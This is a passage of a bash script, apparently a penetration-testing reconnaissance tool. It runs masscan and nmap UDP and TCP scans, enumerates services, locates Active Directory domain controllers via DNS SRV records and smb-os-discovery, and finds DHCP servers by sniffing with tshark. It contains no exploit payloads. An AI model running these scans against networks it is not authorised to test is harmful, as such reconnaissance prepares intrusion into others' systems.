            echo -e "${YELLOW}[!] WARNING: No live hosts detected with open TCP ports by the Intermediate TCP scan (2.2).${NC}" | tee -a "$LOG_FILE" | tee -a "$SCANNING_LOG"
        else
            echo -e "${GREEN}[+] Online hosts with open TCP ports from Intermediate TCP scan (2.2): $DISCOVERED_LIVE_HOSTS_TCP_2_2${NC}" | tee -a "$LOG_FILE" | tee -a "$SCANNING_LOG"
        fi
    fi

    # 2.3. Advanced: Include UDP scanning for a thorough analysis.
    if [ "$SCAN_LEVEL" -ge 3 ]; then 
        local udp_scan_target
        if [ -z "$DISCOVERED_LIVE_HOSTS" ]; then
            echo -e "${YELLOW}[!] WARNING: No online hosts found from Basic Host Discovery (2.1). Falling back to scanning the entire target range ($TARGET_RANGE) for Advanced UDP scan (2.3).${NC}" | tee -a "$LOG_FILE" | tee -a "$SCANNING_LOG"
            udp_scan_target="$TARGET_RANGE"
        else
            echo -e "${CYAN}[i] 2.3. Executing Advanced Scanning: Performing UDP port discovery with Masscan across *online IPs from 2.1*.${NC}" | tee -a "$LOG_FILE"
            udp_scan_target="$DISCOVERED_LIVE_HOSTS"
        fi
        
        local udp_masscan_output="${OUTPUT_DIR}/udp_masscan_scan.txt"
        local nmap_udp_fallback_output="${OUTPUT_DIR}/nmap_udp_fallback_scan.txt" # New fallback file

        # Clean up old Masscan output file before running
        rm -f "$udp_masscan_output" "$nmap_udp_fallback_output" # Clean fallback too

        start_spinner "Running Masscan for initial UDP port discovery"
        echo # Newline after spinner start
        # FIX: Add the target IPs to the masscan command
        local masscan_cmd_array=(sudo masscan -pU:1-65535 --rate=10000 -oL "$udp_masscan_output" $(echo "$udp_scan_target" | tr ',' ' '))
        echo -e "${CYAN}Executing: ${BLUE}${masscan_cmd_array[*]}${NC}" | tee -a "$SCANNING_LOG"
        { # Start block for teeing Masscan output
          echo "--- Masscan UDP Scan Results ---" >> "$SCANNING_LOG" # Explicitly redirect header
          "${masscan_cmd_array[@]}" 2>&1 | tee -a "$SCANNING_LOG" # Execute and tee
        }
        local masscan_exit_code=${PIPESTATUS[0]} # Capture exit code
        stop_spinner
        echo # Ensure a clean line after spinner
        
        if [ "$masscan_exit_code" -ne 0 ] || echo "$masscan_raw_output" | grep -q "could not determine default interface"; then 
            # Changed from RED and ERROR to CYAN and INFO
            echo -e "${CYAN}[i] INFO: Masscan UDP scan failed (exit code $masscan_exit_code) or could not determine default interface. Attempting Nmap UDP fallback scan.${NC}" | tee -a "$LOG_FILE" | tee -a "$SCANNING_LOG"
            
            # Fallback to Nmap UDP scan on top 100 ports if masscan fails
            if [ -n "$DISCOVERED_LIVE_HOSTS" ]; then
                echo -e "${CYAN}[i] Masscan failed. Performing Nmap UDP fallback scan on top 100 ports for online hosts from 2.1: ${DISCOVERED_LIVE_HOSTS}${NC}" | tee -a "$LOG_FILE" | tee -a "$SCANNING_LOG"
                
                start_spinner "Running Nmap UDP fallback scan (top 100 ports)"
                echo # Newline after spinner start
                { # Start block for teeing Nmap output
                    echo "--- Nmap UDP Fallback Scan Results (Top 100 Ports) ---" >> "$SCANNING_LOG"
                    local nmap_udp_fallback_cmd_array=(sudo nmap -sU -sV --top-ports 100 -oN "$nmap_udp_fallback_output")
                    if [ -n "$NMAP_STATS_EVERY_INTERVAL" ]; then
                        nmap_udp_fallback_cmd_array+=("--stats-every" "$NMAP_STATS_EVERY_INTERVAL")
                    fi
                    echo -e "${CYAN}Executing: ${BLUE}${nmap_udp_fallback_cmd_array[*]} $(echo "$DISCOVERED_LIVE_HOSTS" | tr ',' ' ')${NC}" | tee -a "$SCANNING_LOG"
                    "${nmap_udp_fallback_cmd_array[@]}" $(echo "$DISCOVERED_LIVE_HOSTS" | tr ',' ' ') 2>&1 | tee -a "$SCANNING_LOG"
                }
                local nmap_udp_fallback_exit_code=${PIPESTATUS[0]}
                stop_spinner
                echo # Ensure a clean line after spinner
                
                if [ "$nmap_udp_fallback_exit_code" -eq 0 ]; then
                    echo -e "${GREEN}[+] Nmap UDP fallback scan completed successfully.${NC}" | tee -a "$LOG_FILE" | tee -a "$SCANNING_LOG"
                    
                    # Populate DISCOVERED_UDP_PORTS and DISCOVERED_LIVE_HOSTS_UDP_2_3 from Nmap fallback output
                    DISCOVERED_UDP_PORTS=$(grep "open" "$nmap_udp_fallback_output" | grep "udp" | awk '{print $1}' | cut -d'/' -f1 | sort | uniq | paste -s -d, -)
                    DISCOVERED_LIVE_HOSTS_UDP_2_3=$(grep "open" "$nmap_udp_fallback_output" | awk '{print $5}' | sort | uniq | paste -s -d, -)
                else
                    echo -e "${RED}[!] ERROR: Nmap UDP fallback scan also failed with exit code $nmap_udp_fallback_exit_code. No UDP results will be available.${NC}" | tee -a "$LOG_FILE" | tee -a "$SCANNING_LOG"
                fi
            else
                echo -e "${YELLOW}[!] WARNING: Masscan failed and no online hosts were discovered by 2.1. Skipping Nmap UDP fallback scan.${NC}" | tee -a "$LOG_FILE" | tee -a "$SCANNING_LOG"
            fi
        else # Masscan was successful
            echo -e "${GREEN}[+] Masscan UDP scan completed successfully.${NC}" | tee -a "$LOG_FILE" | tee -a "$SCANNING_LOG"

            # Display raw masscan output file content to the terminal
            echo -e "\n--- Raw Masscan UDP Scan Output ---"
            cat "$udp_masscan_output"
            echo -e "--- End Raw Masscan UDP Scan Output ---\n"

            # Masscan -oL output format is "state protocol port ip id timestamp"
            # For example: "open udp 53 192.168.150.100 1751291910"
            # Port number is field 3.
            DISCOVERED_UDP_PORTS=$(grep '^open ' "$udp_masscan_output" | awk '{print $3}' | sort | uniq | paste -s -d, -)

            # IP address is field 4.
            DISCOVERED_LIVE_HOSTS_UDP_2_3=$(grep '^open ' "$udp_masscan_output" | awk '{print $4}' | sort | uniq | paste -s -d, -)
        fi

        if [[ -z "$DISCOVERED_UDP_PORTS" ]]; then
            echo -e "${CYAN}[i] No open UDP ports found by Masscan or Nmap fallback.${NC}" | tee -a "$LOG_FILE" | tee -a "$SCANNING_LOG"
        else
            echo -e "${GREEN}[+] Open UDP ports found: $DISCOVERED_UDP_PORTS (Service detection will occur during enumeration).${NC}" | tee -a "$LOG_FILE" | tee -a "$SCANNING_LOG"
        fi

        if [ -z "$DISCOVERED_LIVE_HOSTS_UDP_2_3" ]; then
            echo -e "${YELLOW}[!] WARNING: No live hosts detected with open UDP ports by the Advanced UDP scan (2.3) or its fallback.${NC}" | tee -a "$LOG_FILE" | tee -a "$SCANNING_LOG"
        else
            echo -e "${GREEN}[+] Online hosts with open UDP ports from Advanced UDP scan (2.3) or its fallback: $DISCOVERED_LIVE_HOSTS_UDP_2_3${NC}" | tee -a "$LOG_FILE" | tee -a "$SCANNING_LOG"
        fi
    fi

    # Populate global DISCOVERED_TCP_PORTS from the *final* comprehensive TCP scan results
    # Added cut -d'/' -f1 to ensure only the port number is stored
    local all_open_tcp_ports_raw=$(grep "open" "$nmap_final_tcp_scan_txt" | grep "tcp" | awk '{print $1}' | cut -d'/' -f1)
    DISCOVERED_TCP_PORTS=$(echo "$all_open_tcp_ports_raw" | sort | uniq | paste -s -d, -)
}

# --- 3. Enumeration Mode: ---
run_enumeration() {
    if [ "$ENUM_LEVEL" -eq 0 ]; then
        print_stage "3. Enumeration Mode Skipped" | tee -a "$LOG_FILE"
        return
    fi
    
    local level_name
    case "$ENUM_LEVEL" in
        1) level_name="Basic" ;;
        2) level_name="Intermediate" ;;
        3) level_name="Advanced" ;;
        *) level_name="Unknown" ;;
    esac
    print_stage "3. Enumeration Mode (Level: $ENUM_LEVEL - $level_name)" | tee -a "$LOG_FILE"
    
    # Determine the 'live_hosts' for enumeration: either discovered live hosts, or the entire target range as a fallback.
    local live_hosts="$([ -n "$DISCOVERED_LIVE_HOSTS" ] && echo "$DISCOVERED_LIVE_HOSTS" || echo "$TARGET_RANGE")"
    
    if [ -z "$DISCOVERED_LIVE_HOSTS" ]; then
        echo -e "${YELLOW}[!] No online TCP hosts found from the scanning phase (2.1). Proceeding with enumeration on the *entire target range*: $live_hosts${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
    else
        echo -e "${GREEN}[+] Proceeding with enumeration on identified online TCP hosts from 2.1: $live_hosts${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
    fi


    # 3.1. Basic Enumeration:
    
    # 3.1.1. Identify services (-SV) running on open ports.
    
    if [ "$ENUM_LEVEL" -ge 1 ]; then    

        # --- TCP Service Scan ---
        local hosts_for_tcp_service_scan=""
        if [ -n "$DISCOVERED_LIVE_HOSTS" ]; then
            hosts_for_tcp_service_scan="$DISCOVERED_LIVE_HOSTS"
            echo -e "${CYAN}[i] 3.1.1. Performing TCP service identification on *online hosts from 2.1*: ${hosts_for_tcp_service_scan}.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        else
            hosts_for_tcp_service_scan="$TARGET_RANGE"
            echo -e "${CYAN}[i] Performing TCP service identification on *entire target range*: ${hosts_for_tcp_service_scan}.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        fi

        local tcp_ports_to_scan=""
        if [ -n "$DISCOVERED_TCP_PORTS" ]; then
            tcp_ports_to_scan="${DISCOVERED_TCP_PORTS}"
            echo -e "${CYAN}[i] Using discovered TCP ports from scanning phase: ${tcp_ports_to_scan}.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        else
            # Changed from "-" to "1-65535" for explicit range
            tcp_ports_to_scan="1-65535" # All TCP ports fallback
            echo -e "${YELLOW}[!] WARNING: No specific open TCP ports discovered in Scanning stage or it was not executed. Defaulting to *all TCP ports 1-65535* for service identification.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        fi

        start_spinner "Identifying TCP services with Nmap"
        echo # Newline after spinner start
        rm -f "$NMAP_TCP_SERVICE_SCAN_OUTPUT" # Clean old output file

        local nmap_tcp_sv_cmd_array=(sudo nmap -sV -pT:${tcp_ports_to_scan} -oN "$NMAP_TCP_SERVICE_SCAN_OUTPUT")
        if [ -n "$NMAP_STATS_EVERY_INTERVAL" ]; then
            nmap_tcp_sv_cmd_array+=("--stats-every" "$NMAP_STATS_EVERY_INTERVAL")
        fi

        echo -e "${CYAN}Executing TCP Service Scan: ${BLUE}${nmap_tcp_sv_cmd_array[*]} $(echo "$hosts_for_tcp_service_scan" | tr ',' ' ')${NC}" | tee -a "$ENUMERATION_LOG"
        {
            echo "--- Nmap TCP Service Scan Results ---" >> "$ENUMERATION_LOG"
            "${nmap_tcp_sv_cmd_array[@]}" $(echo "$hosts_for_tcp_service_scan" | tr ',' ' ') 2>&1 | tee -a "$ENUMERATION_LOG"
        }
        local nmap_tcp_sv_exit_code=${PIPESTATUS[0]}
        stop_spinner
        echo # Ensure a clean line after spinner

        if [ "$nmap_tcp_sv_exit_code" -ne 0 ]; then
            echo -e "${RED}[!] WARNING: Nmap TCP service scan failed with exit code $nmap_tcp_sv_exit_code. Target may be unresponsive or filtered.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        fi
        echo -e "${GREEN}[+] TCP service scan results saved to: ${NMAP_TCP_SERVICE_SCAN_OUTPUT}${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"


        # --- UDP Service Scan (only if SCAN_LEVEL >= 3 and UDP ports/hosts were found) ---
        if [ "$SCAN_LEVEL" -ge 3 ] && [ -n "$DISCOVERED_UDP_PORTS" ] && [ -n "$DISCOVERED_LIVE_HOSTS_UDP_2_3" ]; then
            echo -e "${CYAN}[i] 3.1.1. Performing separate UDP service identification on *online UDP hosts from 2.3*: ${DISCOVERED_LIVE_HOSTS_UDP_2_3}.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
            echo -e "${CYAN}[i] Using discovered UDP ports from scanning phase: ${DISCOVERED_UDP_PORTS}.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"

            start_spinner "Identifying UDP services with Nmap"
            echo # Newline after spinner start
            rm -f "$NMAP_UDP_SERVICE_SCAN_OUTPUT" # Clean old output file

            local nmap_udp_sv_cmd_array=(sudo nmap -sU -sV -pU:${DISCOVERED_UDP_PORTS} -oN "$NMAP_UDP_SERVICE_SCAN_OUTPUT")
            if [ -n "$NMAP_STATS_EVERY_INTERVAL" ]; then
                nmap_udp_sv_cmd_array+=("--stats-every" "$NMAP_STATS_EVERY_INTERVAL")
            fi

            echo -e "${CYAN}Executing UDP Service Scan: ${BLUE}${nmap_udp_sv_cmd_array[*]} $(echo "$DISCOVERED_LIVE_HOSTS_UDP_2_3" | tr ',' ' ')${NC}" | tee -a "$ENUMERATION_LOG"
            {
                echo "--- Nmap UDP Service Scan Results ---" >> "$ENUMERATION_LOG"
                "${nmap_udp_sv_cmd_array[@]}" $(echo "$DISCOVERED_LIVE_HOSTS_UDP_2_3" | tr ',' ' ') 2>&1 | tee -a "$ENUMERATION_LOG"
            }
            local nmap_udp_sv_exit_code=${PIPESTATUS[0]}
            stop_spinner
            echo # Ensure a clean line after spinner

            if [ "$nmap_udp_sv_exit_code" -ne 0 ]; then
                echo -e "${RED}[!] WARNING: Nmap UDP service scan failed with exit code $nmap_udp_sv_exit_code. Target may be unresponsive or filtered.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
            fi
            echo -e "${GREEN}[+] UDP service scan results saved to: ${NMAP_UDP_SERVICE_SCAN_OUTPUT}${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        elif [ "$SCAN_LEVEL" -ge 3 ]; then
            echo -e "${YELLOW}[!] WARNING: Advanced Scanning (2.3) was selected, but no open UDP ports or live UDP hosts were discovered. Skipping UDP service identification.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        else
            echo -e "${CYAN}[i] Skipping UDP service identification as Advanced Scanning (2.3) was not performed.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        fi

        # --- Combine TCP and UDP Service Scan Results into a single log for next steps ---
        echo -e "${CYAN}[i] Combining TCP and UDP service scan results into a single log for subsequent steps: ${NMAP_ALL_SERVICE_SCAN_OUTPUT}${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        start_spinner "Combining TCP and UDP service scan results"
        echo # Newline after spinner start
        rm -f "$NMAP_ALL_SERVICE_SCAN_OUTPUT" # Ensure it's clean before combining
        cat "$NMAP_TCP_SERVICE_SCAN_OUTPUT" >> "$NMAP_ALL_SERVICE_SCAN_OUTPUT"
        if [ -f "$NMAP_UDP_SERVICE_SCAN_OUTPUT" ] && [ -s "$NMAP_UDP_SERVICE_SCAN_OUTPUT" ]; then
            echo -e "\n--- Appending UDP Service Scan Results ---" >> "$NMAP_ALL_SERVICE_SCAN_OUTPUT"
            cat "$NMAP_UDP_SERVICE_SCAN_OUTPUT" >> "$NMAP_ALL_SERVICE_SCAN_OUTPUT"
        fi
        stop_spinner
        echo -e "${GREEN}[+] All service scan results available in: ${NMAP_ALL_SERVICE_SCAN_OUTPUT}${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        
        # Write the combined service scan output to the enumeration log explicitly
        echo -e "\n--- Consolidated Service Scan Output ($NMAP_ALL_SERVICE_SCAN_OUTPUT) ---" | tee -a "$ENUMERATION_LOG"
        cat "$NMAP_ALL_SERVICE_SCAN_OUTPUT" | tee -a "$ENUMERATION_LOG"
        echo -e "${GREEN}[+] Service detection summary complete.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"


        # 3.1.2. Identify the IP Address of the Domain Controller.
        echo -e "${GREEN}[+] 3.1.2. Attempting to identify Domain Controller IP and Hostname...${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"

        # Try dig first for SRV records if domain name and dig are available
        if command -v dig &> /dev/null && [ -n "$AD_DOMAIN_NAME" ]; then # Changed from DOMAIN_NAME
            echo -e "${CYAN}[i] Attempting to identify Domain Controller IP via DNS SRV records (dig)...${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
            
            local srv_query_ldap="_ldap._tcp.dc._msdcs.${AD_DOMAIN_NAME}" # Changed from DOMAIN_NAME
            local srv_query_kerberos="_kerberos._tcp.dc._msdcs.${AD_DOMAIN_NAME}" # Changed from DOMAIN_NAME

            start_spinner "Querying DNS SRV records for DC"
            echo # Newline after spinner start
            echo -e "${CYAN}Executing: ${BLUE}dig +short SRV ${srv_query_ldap} ${srv_query_kerberos}${NC}" | tee -a "$LOG_FILE"
            local srv_output=$(dig +short SRV "$srv_query_ldap" "$srv_query_kerberos" 2>/dev/null | tee -a "$ENUMERATION_LOG")
            stop_spinner
            echo # Ensure a clean line after spinner
            
            if [ -n "$srv_output" ]; then
                # Extract the target hostname from the SRV records (last field)
                # Then, resolve that hostname to an IP address using dig A record query
                local dc_hostname_from_dig=$(echo "$srv_output" | awk '{print $NF}' | head -n 1 | sed 's/\.$//') # Remove trailing dot
                if [ -n "$dc_hostname_from_dig" ]; then
                    start_spinner "Resolving DC hostname to IP"
                    echo # Newline after spinner start
                    echo -e "${CYAN}Executing: ${BLUE}dig +short A ${dc_hostname_from_dig}${NC}" | tee -a "$LOG_FILE"
                    DOMAIN_CONTROLLER_IP=$(dig +short A "$dc_hostname_from_dig" | grep -E '^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$' | head -n 1 | tee -a "$ENUMERATION_LOG")
                    stop_spinner
                    echo # Ensure a clean line after spinner
                    DC_HOSTNAME="$dc_hostname_from_dig" # Set DC_HOSTNAME here from dig result
                fi

                if [ -n "$DOMAIN_CONTROLLER_IP" ]; then
                    echo -e "${GREEN}[+] Domain Controller IP (from DNS SRV): $DOMAIN_CONTROLLER_IP (Hostname: $DC_HOSTNAME)${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
                else
                    echo -e "${YELLOW}[!] WARNING: Found SRV records but could not resolve DC hostname to an IP. Falling back to Nmap scan results.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
                fi
            else
                echo -e "${CYAN}[i] No relevant AD SRV records found for '${AD_DOMAIN_NAME}' via dig. Falling back to Nmap scan results.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG" # Changed from DOMAIN_NAME
            fi
        else
            echo -e "${CYAN}[i] Skipping DNS SRV record lookup for DC: dig not found or Domain name not provided.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        fi

        # Fallback to Nmap awk logic if DOMAIN_CONTROLLER_IP is not yet found
        if [ -z "$DOMAIN_CONTROLLER_IP" ]; then
            echo -e "${CYAN}[i] Attempting to find Domain Controller IP in previous Nmap scans (looking for Kerberos or LDAP services).${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
            
            # Use awk to parse Nmap -oN output for AD-related services and their IPs
            local all_found_dc_ips=$(awk '
            BEGIN {
                # Define a list of ports and their associated services for TCP
                tcp_services["88"] = "kerberos";
                tcp_services["389"] = "ldap";
                tcp_services["464"] = "kpasswd5";
                tcp_services["3268"] = "globalcatLDAP";
                tcp_services["3269"] = "globalcatLDAP";
                tcp_services["9389"] = "adws";

                # Define a list of ports and their associated services for UDP
                udp_services["88"] = "kerberos";
                udp_services["389"] = "ldap";
                udp_services["464"] = "kpasswd5";
            }

            /Nmap scan report for/ {
                current_ip = $NF;
                gsub(/\(|\)/, "", current_ip); # Remove parentheses if present
                next; # Move to the next line
            }

            # Process lines that indicate an open port
            /^[0-9]+\/(tcp|udp)\s+open/ {
                split($1, port_proto, "/");
                port = port_proto[1];
                protocol = port_proto[2];
                service = $3; # Assuming service is the third field after port/proto and state

                # Check for TCP services
                if (protocol == "tcp" && (port in tcp_services)) {
                    # Check if the detected service name contains the expected service string
                    if (service ~ tcp_services[port]) {
                        print current_ip;
                    }
                }
                # Check for UDP services
                else if (protocol == "udp" && (port in udp_services)) {
                    # Check if the detected service name contains the expected service string
                    if (service ~ udp_services[port]) {
                        print current_ip;
                    }
                }
            }' "$NMAP_ALL_SERVICE_SCAN_OUTPUT" | sort | uniq)

            if [ -n "$all_found_dc_ips" ]; then
                # Set DOMAIN_CONTROLLER_IP to the first found IP
                DOMAIN_CONTROLLER_IP=$(echo "$all_found_dc_ips" | head -n 1)
                echo -e "${GREEN}[+] Domain Controller IP (from Nmap scan results): $DOMAIN_CONTROLLER_IP${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"

                echo -e "${GREEN}[+] Potentially found Domain Controller IPs from Nmap scan results:${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
                # Display all found IPs to the user
                echo "$all_found_dc_ips" | while read -r ip; do
                    echo -e "${GREEN}  - $ip${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
                done
                
                echo -e "${CYAN}[i] Attempting to get hostname information for the identified DC IPs using Nmap smb-os-discovery script.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
                
                local nmap_smb_os_discovery_output="${OUTPUT_DIR}/nmap_smb_os_discovery.txt"
                
                # Pass all found IPs to Nmap smb-os-discovery
                local smb_os_discovery_cmd_array=(sudo nmap -Pn -sV -p 445 --script smb-os-discovery -oN "$nmap_smb_os_discovery_output")
                if [ -n "$NMAP_STATS_EVERY_INTERVAL" ]; then
                    smb_os_discovery_cmd_array+=("--stats-every" "$NMAP_STATS_EVERY_INTERVAL")
                fi
                rm -f "$nmap_smb_os_discovery_output" # Clean old output file
                
                start_spinner "Identifying DC hostname with Nmap smb-os-discovery on all found DCs"
                echo # Newline after spinner start
                echo -e "${CYAN}Executing: ${BLUE}${smb_os_discovery_cmd_array[*]} $(echo "$all_found_dc_ips" | tr ',' ' ')${NC}" | tee -a "$ENUMERATION_LOG"
                # Execute command, capture output to file, and tee to enumeration log
                "${smb_os_discovery_cmd_array[@]}" $(echo "$all_found_dc_ips" | tr ',' ' ') 2>&1 | tee -a "$ENUMERATION_LOG"
                local smb_os_discovery_exit_code=${PIPESTATUS[0]}
                stop_spinner
                echo # Ensure a clean line after spinner
                if [ "$smb_os_discovery_exit_code" -ne 0 ]; then 
                    echo -e "${YELLOW}[!] WARNING: Nmap smb-os-discovery script failed on one or more DC IPs with exit code $smb_os_discovery_exit_code. SMB service might be unavailable or filtered.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
                fi
                
                # Extract Computer name from smb-os-discovery output to get DC_HOSTNAME
                DC_HOSTNAME=$(awk -F': ' '/Computer name:/ {print $2; exit}' "$nmap_smb_os_discovery_output" | sed 's/\.$//') # Remove trailing dot

                if [ -z "$DC_HOSTNAME" ]; then DC_HOSTNAME="Unknown"; fi
                echo -e "${GREEN}  - Domain Controller Hostname (from smb-os-discovery): $DC_HOSTNAME${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
            else
                echo -e "${YELLOW}[!] Domain Controller: Not found via Nmap port scans.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
            fi
        fi

        # Explicitly output final DC IP and Hostname status
        if [ -n "$DOMAIN_CONTROLLER_IP" ]; then
            echo -e "${GREEN}[+] Domain Controller identified: IP: $DOMAIN_CONTROLLER_IP, Hostname: $DC_HOSTNAME${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        else
            echo -e "${YELLOW}[!] Domain Controller could not be identified.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        fi

        # 3.1.3. Identify the IP Address of the DHCP server.
        echo -e "${GREEN}[+] 3.1.3. Attempting to identify DHCP Server IP...${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        local NMAP_DHCP=""
        
        # Try Nmap dhcp-discover script first
        if command -v nmap &> /dev/null; then
            echo -e "${CYAN}[i] Discovering DHCP server with Nmap dhcp-discover.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
            local nmap_dhcp_discover_output="${OUTPUT_DIR}/nmap_dhcp_discover.txt"
            local dhcp_discover_cmd_array=(sudo nmap -Pn -sU -p67 --script=dhcp-discover -oN "$nmap_dhcp_discover_output" "$TARGET_RANGE")
            if [ -n "$NMAP_STATS_EVERY_INTERVAL" ]; then
                dhcp_discover_cmd_array+=("--stats-every" "$NMAP_STATS_EVERY_INTERVAL")
            fi
            rm -f "$nmap_dhcp_discover_output" # Clean old output file

            start_spinner "Discovering DHCP server with Nmap"
            echo # Newline after spinner start
            echo -e "${CYAN}Executing: ${BLUE}${dhcp_discover_cmd_array[*]}${NC}" | tee -a "$ENUMERATION_LOG"
            {
                echo -e "\n--- Nmap DHCP Discover Results ---" >> "$ENUMERATION_LOG"
                "${dhcp_discover_cmd_array[@]}" 2>&1 | tee -a "$ENUMERATION_LOG"
            }
            local nmap_dhcp_exit_code=${PIPESTATUS[0]}
            stop_spinner
            echo # Ensure a clean line after spinner
            
            NMAP_DHCP=$(grep 'DHCP Server Identifier' "$nmap_dhcp_discover_output" | awk -F': ' '{print $2}' | head -n1)

            if [ -z "$NMAP_DHCP" ]; then
                echo -e "${YELLOW}[!] WARNING: Nmap dhcp-discover script didn't find a DHCP server (exit code $nmap_dhcp_exit_code). Attempting passive discovery with tshark.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
            fi
        else
            echo -e "${YELLOW}[!] WARNING: Nmap not found. Attempting passive DHCP discovery with tshark.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        fi
        
        # Fallback to tshark for passive DHCP discovery if Nmap failed or is not available
        if [ -z "$NMAP_DHCP" ] && command -v tshark &> /dev/null; then
            echo -e "${CYAN}[i] Attempting passive DHCP discovery using tshark.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
            
            local tshark_dhcp_output="${OUTPUT_DIR}/tshark_dhcp_discover.txt"
            local active_interface=$(ip route get 1.1.1.1 | awk '{print $5}' | head -n 1) # Attempt to find default active interface

            if [ -z "$active_interface" ]; then
                echo -e "${YELLOW}[!] WARNING: Could not determine active network interface for tshark. Skipping passive DHCP discovery.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
            else
                start_spinner "Listening for DHCP traffic with Tshark on $active_interface"
                echo # Newline after spinner start
                local tshark_cmd_array=(sudo tshark -i "$active_interface" -f "port 67 or port 68" -Y 'bootp.option.dhcp == 2' -a duration:30 -c 10 -T fields -e ip.src)
                echo -e "${CYAN}Executing: ${BLUE}${tshark_cmd_array[*]}${NC}" | sort -u | tee -a "$ENUMERATION_LOG"
                {
                    echo -e "\n--- Tshark DHCP Discover Results ---" >> "$ENUMERATION_LOG"
                    local tshark_output=$("${tshark_cmd_array[@]}" 2>&1)
                    local tshark_exit_code=${PIPESTATUS[0]}
                    echo "$tshark_output" | tee -a "$ENUMERATION_LOG"
                    
                    if [ "$tshark_exit_code" -ne 0 ] && [ "$tshark_exit_code" -ne 124 ]; then # 124 is timeout exit code
                        echo -e "${YELLOW}[!] WARNING: Tshark DHCP discovery failed with exit code $tshark_exit_code (excluding timeout). Check permissions or interface.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
                    fi

                    # Extract the IP from tshark output (it should be the only line if successful)
                    local TSHARK_DHCP=$(echo "$tshark_output" | grep -E '^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$' | head -n 1)
                    
                    if [ -n "$TSHARK_DHCP" ]; then
                        DHCP_SERVER="$TSHARK_DHCP"
                        echo -e "${GREEN}[+] DHCP Server IP (from Tshark): $DHCP_SERVER${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
                    else
                        echo -e "${YELLOW}[!] Tshark did not capture a DHCP server identifier within the timeout period.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
                    fi
                }
                stop_spinner
                echo # Ensure a clean line after spinner
            fi
        elif [ -z "$NMAP_DHCP" ]; then # Only if Nmap failed and tshark is not available
            echo -e "${YELLOW}[!] WARNING: tshark not found. Passive DHCP discovery cannot be performed.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        fi
        
        # Final update of DHCP_SERVER variable (if NMAP_DHCP was found, it takes precedence)
        DHCP_SERVER="${NMAP_DHCP:-$DHCP_SERVER}" # Use NMAP_DHCP if set, otherwise use what tshark found
        
        {
            if [ -n "$DHCP_SERVER" ]; then echo "  - DHCP Server IP: $DHCP_SERVER"; else echo -e "${YELLOW}[!] - DHCP Server: Not Found${NC}"; fi
        } | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
    fi

    # 3.2. Intermediate:
    if [ "$ENUM_LEVEL" -ge 2 ]; then
        echo -e "${GREEN}[+] 3.2. Performing Intermediate Enumeration: Key services and NSE scripts.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"

        # 3.2.1. Enumerate IPs for key services: FTP, SSH, SMB, WinRM, LDAP, RDP.
        # Instead of running a new Nmap scan, parse the NMAP_ALL_SERVICE_SCAN_OUTPUT.
        echo -e "${GREEN}[+] 3.2.1. Enumerating IPs for key services (FTP, SSH, SMB, WinRM, LDAP, RDP) from consolidated service scan results.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        
